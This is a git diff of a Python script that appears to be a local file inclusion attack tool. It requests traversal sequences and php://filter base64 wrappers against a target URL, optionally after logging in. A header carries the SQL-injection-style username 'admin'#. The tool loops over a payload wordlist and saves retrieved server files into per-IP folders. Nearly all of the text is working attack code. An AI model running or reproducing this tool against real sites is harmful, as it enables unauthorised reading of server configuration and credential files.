@@ -24,25 +24,25 @@ class Read_File:
                print("[+] Login url        : ................ | : "+self.args.loginurl)
                print("[+] username         : ................ | : "+self.args.user)
                print("[+] Login password   : ................ | : "+self.args.password)
-            print("[+] LFI-wordlist     : ................ | : "+self.args.filelist)
-            print("[+] Vulnrenable url  : ................ | : "+self.args.Vulnurl)
+            print("[+] self.LFI-wordlist   : ................ | : "+self.args.filelist)
+            print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
             if self.args.base64:
-               print("[+] PHP-Filter       : ................ | : Convert-base64") 
-            print("[+] web Cookies      : ................ | : "+self.Cookie) 
+               print("[+] PHP-Filter          : ................ | : Convert-base64") 
+            print("[+] web Cookies         : ................ | : "+self.Cookie) 
             if self.args.auth and self.args.Vulnurl\
             and self.args.password and self.args.user\
             and self.args.Cookie and self.args.loginurl\
-            and self.args.filelist:
+            and self.args.read:
                 self.Login_auth()
                 self.url_request()
             elif not self.args.auth and self.args.Vulnurl\
             and not self.args.password and not self.args.user and self.args.Cookie\
-            and self.args.filelist :
+            and self.args.read :
                 self.url_request()
             else:
                 print("[+] Logic command  Error"+'\n'+'='*30)  
-                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ')  
-                print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie')  
+                print('[+] To use self.LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ')  
+                print('[+] To use self.LFI without  login : --Vulnurl --read --Cookie')  
      def Login_auth(self):
             loginurl = self.args.loginurl
             request = mechanize.Browser()
@@ -69,71 +69,84 @@ class Read_File:
             self.info = response.info()
             content    = response.read()  
             self.url = response.geturl()      
-     def url_request(self):            
-            LFI=''
-            if self.args.base64 :
-              LFI += self.args.Vulnurl
-              LFI +='php://filter/read=convert.base64-encode/resource='
-            else:
-                 LFI += self.args.Vulnurl 
-            LFI += "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
-            ssl._create_default_https_context = ssl._create_unverified_context                
-            with  open(self.args.filelist,'r') as list_command  :  
-                  command  = self.args.read                                      
-            if self.args.auth:
-               self.Login_auth() 
-            command  = str(command).replace('/','%2F')         
-            self.url = LFI+command
-            request = mechanize.Browser()
-            request.set_handle_robots(False)
-            request.set_handle_redirect(True)
-            request.set_handle_refresh(True, max_time=1)              
-            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
+     def url_request(self):   
+           self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
+                      [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.args.Vulnurl)#).strip()
+           if not os.path.exists('./FileStore/'+self.ip_re.group()+"/"):
+                  os.makedirs('./FileStore/'+self.ip_re.group()+"/") 
+           if self.args.auth:
+               self.Login_auth()  
+                        
+           with open('LFT_one.txt','r') as readline :
+                command_dir = readline.readlines()
+                for LINE in command_dir :
+                    LINE.replace('\n','')
+                    self.LFi = ''
+                    if self.args.base64:
+                        phpfillter = 'php://filter/read=convert.base64-encode/resource='
+                        URL = self.args.Vulnurl+ phpfillter
+
+                    else:
+                         URL = self.args.Vulnurl 
+                    if '//' in LINE and not 'file' in LINE:  
+                        self.LFI =URL+LINE+self.args.read.replace('/','//')
+                    elif '%2f' in LINE  :
+                          self.LFI = URL+LINE+self.args.read.replace('/','%2f')
+                    elif 'file:' in LINE :
+                         self.LFI = URL+LINE+self.args.read.replace('/','',1)       
+                    else:
+                        self.LFI = URL+LINE+self.args.read                                                                                               
+                    self.url = self.LFI
+                    request = mechanize.Browser()
+                    request.set_handle_robots(False)
+                    request.set_handle_redirect(True)
+                    request.set_handle_refresh(True, max_time=1)              
+                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                  Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                  ('Cookie',str(self.Cookie).replace('\n','')),
                                  ('username',"admin'#"),
                                  ('password','password')]
-            first_req = request.open(self.args.Vulnurl).read()                                                      
-            self.Get_Oregnal_URL = request.open(self.url).read() 
-            self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
-            [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.url)#).strip()
-            if not os.path.exists('./FileStore/'+self.ip_re.group()+"/"):
-               os.makedirs('./FileStore/'+self.ip_re.group()+"/") 
-            if self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :                  
-                  pythex = str(re.findall('Content-Length:.+',str(self.info)))
-                  pythex= pythex.replace("['",'').replace("']",'')
-                  if pythex in str(self.info):
-                     info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
-                     rex2 = re.findall(':.+',info)
-                     print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
-                     print("[+] Date             : ................ | "+rex2[0])
-                     print("[+] Server           : ................ | "+rex2[1])
-                     print("[+] Expires          : ................ | "+rex2[2])
-                     print("[+] Cache-Control    : ................ | "+rex2[3])
-                     print("[+] Pragma           : ................ | "+rex2[4])
-                     print("[+] Vary             : ................ | "+rex2[5])
-                     print("[+] Content-Length   : ................ | "+str(rex2[6]).replace(':',': '))
-                     print("[+] Connection       : ................ | "+rex2[7])
-                     print("[+] Content-Type     : ................ | "+rex2[8]+'\n')
-                     self.store_file()
-                     print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
-                     print("[+] File request        : ................ | : "+command.replace('\n','')) 
-                     print("[+] Full Path           : ................ | : "+self.url.replace('\n',''))
-                     print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
-                     print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'))
-            elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req):
-                     self.store_file()  
-                     print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
-                     print("[+] File request        : ................ | : "+command.replace('\n','')) 
-                     print("[+] Full  URL           : ................ | : "+self.url.replace('\n',''))
-                     print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
-                     print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
-                     +self.args.read.replace('/','',1).replace('/','_'))                                                                               
+                    first_req = request.open(self.args.Vulnurl).read()                                                      
+                    self.Get_Oregnal_URL = request.open(self.url).read() 
+                    
+                    if self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :                  
+                        pythex = str(re.findall('Content-Length:.+',str(self.info)))
+                        pythex= pythex.replace("['",'').replace("']",'')
+                        if pythex in str(self.info):
+                           info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
+                           rex2 = re.findall(':.+',info)
+                           print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
+                           print("[+] Date             : ................ | "+rex2[0])
+                           print("[+] Server           : ................ | "+rex2[1])
+                           print("[+] Expires          : ................ | "+rex2[2])
+                           print("[+] Cache-Control    : ................ | "+rex2[3])
+                           print("[+] Pragma           : ................ | "+rex2[4])
+                           print("[+] Vary             : ................ | "+rex2[5])
+                           print("[+] Content-Length   : ................ | "+str(rex2[6]).replace(':',': '))
+                           print("[+] Connection       : ................ | "+rex2[7])
+                           print("[+] Content-Type     : ................ | "+rex2[8]+'\n')
+                           self.store_file()
+                           print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+                           print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
+                           print("[+] Full Path           : ................ | : "+self.LFI.replace('\n',''))
+                           print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
+                           print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'))
+                           break
+                    elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req):
+                          self.store_file()  
+                          print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+                          print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
+                          print("[+] Full  URL           : ................ | : "+ self.LFI.replace('\n',''))
+                          print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
+                          print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
+                          +self.args.read.replace('/','',1).replace('/','_'))         
+                          break
+                                                                                             
      def control(self): 
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
            parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
            parser.add_argument("--auth"               , action='store_true'                    ,help ="url Targst web") 
-           parser.add_argument("-F","--filelist"      , action=None         ,required=True     ,help ="read fron lfi wordlsit ")
+           parser.add_argument("-F","--filelist"      , action=None            ,help ="read fron self.LFI wordlsit ")
            parser.add_argument("-C","--Cookie"        , action=None                            ,help ="Login sesion Cookie")  
            parser.add_argument("-B64","--base64"      , action='store_true'                    ,help ="Login sesion base64")  
            parser.add_argument("-R","--read"          , action=None                            ,help ="Login sesion base64")  
